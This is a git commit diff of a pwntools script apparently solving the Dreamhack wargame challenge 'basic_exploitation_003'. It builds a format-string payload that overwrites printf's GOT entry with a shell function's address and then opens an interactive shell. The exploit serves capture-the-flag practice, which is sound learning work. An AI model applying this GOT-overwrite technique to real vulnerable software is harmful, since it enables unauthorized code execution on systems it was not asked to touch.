db5ef660769d16811b8de451c4478f3829b0012c
Brian Lee <hibrian827@gmail.com>
2024-08-17 12:48:24 +0900

    still solving

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -7,10 +7,10 @@ rem = process("./basic_exploitation_003/problem/basic_exploitation_003")
 # shell : 0x8048669
 # pause()
 printf_got = 0x804a010
-# payload = "%2052c%5$hn%38924c%6$hn".ljust(16).encode() + p32(printf_got + 2) + p32(printf_got)
-payload = b'A' * 16 + p32(printf_got + 2)  + p32(printf_got) * 16+ b'.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p'
+payload = "%2052c%5$hn%32352c%6$hn".ljust(16).encode() + p32(printf_got + 2) + p32(printf_got)
+# payload = b'A' * 16 + p32(printf_got + 2)  + p32(printf_got) * 16+ b'.%1$hp.%2$hp.%3$hp.%4$hp.%5$hp.%6$hp'
 
 rem.sendline(payload)
 
-print(rem.recvline())
-# rem.interactive()
+# print(rem.recvline())
+rem.interactive()
